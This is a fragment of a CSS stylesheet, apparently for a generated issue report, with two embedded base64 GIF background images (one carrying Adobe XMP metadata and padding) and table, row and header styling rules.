          url(data:image/gif;base64,R0lGODlhAQAdAMQAAPLu0fHtzvDszO/rye/qx+7pxO3owu3nv+zmvevluurkuOrktenjs+jisejhrufgq+bfqebep+XdpOTcouPbn+PaneLZmuHYmODXk+HXld/WkN7Vjt7UjAAAAAAAAAAAACH/C1hNUCBEYXRhWE1QPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4KPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNC4xLWMwMzQgNDYuMjcyOTc2LCBTYXQgSmFuIDI3IDIwMDcgMjI6Mzc6MzcgICAgICAgICI+CiAgIDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+CiAgICAgIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICAgICAgICAgIHhtbG5zOnhhcD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLyI+CiAgICAgICAgIDx4YXA6Q3JlYXRvclRvb2w+QWRvYmUgRmlyZXdvcmtzIENTMzwveGFwOkNyZWF0b3JUb29sPgogICAgICAgICA8eGFwOkNyZWF0ZURhdGU+MjAwNy0wMS0wNFQyMjoxMDozMVo8L3hhcDpDcmVhdGVEYXRlPgogICAgICAgICA8eGFwOk1vZGlmeURhdGU+MjAwOS0xMC0wNlQxNDowMToyMlo8L3hhcDpNb2RpZnlEYXRlPgogICAgICA8L3JkZjpEZXNjcmlwdGlvbj4KICAgICAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgICAgICAgICAgeG1sbnM6ZGM9Imh0dHA6Ly9wdXJsLm9yZy9kYy9lbGVtZW50cy8xLjEvIj4KICAgICAgICAgPGRjOmZvcm1hdD5pbWFnZS9naWY8L2RjOmZvcm1hdD4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgIDwvcmRmOlJERj4KPC94OnhtcG1ldGE+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgCjw/eHBhY2tldCBlbmQ9InciPz4B//79/Pv6+fj39vX08/Lx8O/u7ezr6uno5+bl5OPi4eDf3t3c29rZ2NfW1dTT0tHQz87NzMvKycjHxsXEw8LBwL++vby7urm4t7a1tLOysbCvrq2sq6qpqKempaSjoqGgn56dnJuamZiXlpWUk5KRkI+OjYyLiomIh4aFhIOCgYB/fn18e3p5eHd2dXRzcnFwb25tbGtqaWhnZmVkY2JhYF9eXVxbWllYV1ZVVFNSUVBPTk1MS0pJSEdGRURDQkFAPz49PAA6OTg3NjU0MzIxMC8uLSwrKikoJyYlJCMiISAfHh0cGxoZGBcWFRQTEhEQDw4NDAsKCQgHBgUEAwIBAAAh+QQABwD/ACwAAAAAAQAdAAAFFSAnYqRlUZQkQZDjMHCSHEdRDEMQhAA7);
          }

          .issueHeader table {
          border-collapse: collapse;
          }

          .issueHeader td {
          font-size: 9pt;
          }

          .issueHeaderPale {
          background-color: #F8F6E6;
          background-repeat: repeat-x;
          background-image:
          url(data:image/gif;base64,R0lGODlhAQAdALMAAPj25vf05Pb04fbz3vTy3PPx2fPw1vLu0/Lu0fHtz/DszO/rye7pxQAAAAAAAAAAACH5BAAHAP8ALAAAAAABAB0AAAQPkMmpqkIYmb2JJ0IoAEAEADs=);
          }

          .issueHeader .headerIssueType {
          height: 28px;
          border-bottom: 1px solid #CCCCCC;
          padding-left: 8px;
          line-height: 29px;
          color: #006699;
          font-size: 12pt;
          font-weight: bold;
          }

          .issueHeader .headerIssueType a {
          color: #3D92AC;
          font-size: 12pt;
          font-weight: bold;
          text-decoration: none;
          }

          .issueHeader .headerIssueType a:hover {
          text-decoration: underline;
          }

          .issueHeader .row,.variant .row,.row {
          display: table-row;
          }

          .row .name {
          display: table-cell;
          padding: 4px 8px 4px 0px;
          vertical-align: top;
          }

          .row .value {
          display: table-cell;
          padding: 4px 0 4px 0;
          width: 100%;
          vertical-align: top;
          }

          .issueHeader .row .name {
          display: table-cell;
          padding: 4px 8px 4px 8px;
          border-bottom: 1px solid #CCCCCC;
          }

          .issueHeader .row .value {
          display: table-cell;
          padding: 4px 0 4px 0;
          border-bottom: 1px solid #CCCCCC;
          width: 100%;
          }

          .issueHeader .row .wordBreaker {
          word-break: break-all;
          }

          .issueHeader .row:last-child .name,.issueHeader .row:last-child .value {
          border-bottom: none;
          }

          .issueHeader .value ul {
          list-style: none;
          }

          .listStyleNone {
          list-style: none;
          padding: 0;
          margin: 0;
          }

          .issueHeader .datatable tr:last-child td {
          border-bottom: none;
          }

          .variant .row td {
          font-size: 9pt;
          }

          .variant .row .name,.variant .row .value {
          display: table-cell;
          vertical-align: top;
          }

          .name {
          color: #333333;
          font-weight: bold;
          padding-right: 16px;
          white-space: nowrap;
          }

          .box {
          color: #fff;
          border-radius: 4px;
          -moz-border-radius: 4px;
          display: inline-block;
          padding: 2px 4px 0 4px;
          font-weight: bold;
          }

          .toc li {
          list-style: square;
          color: #3D92AC;
          }

          .toc a {
          color: #3D92AC;
          text-decoration: none;
          vertical-align: middle;
          }

          .toc a:hover {
          color: #3D92AC;
          text-decoration: underline;
          }

          .datatable {
          width: 100%;
          border-collapse: collapse;
          }

          .tablelayoutfixed {
          table-layout: fixed
          }

          .datatable th,.datatable .th {
          padding: 2px 4px;
          background-color: #3D92AC;
          color: white;
          text-align: left;
          font-weight: bold;
          font-size: 10pt;
          height: 30px;
          page-break-inside: auto;
          }

          .datatable td,.datatable .td {
          border-bottom: 1px solid #cccccc;
          padding: 2px 4px;
          text-overflow: ellipsis;
          font-size: 9pt;
          word-wrap: break-word;
          vertical-align: top;
          }

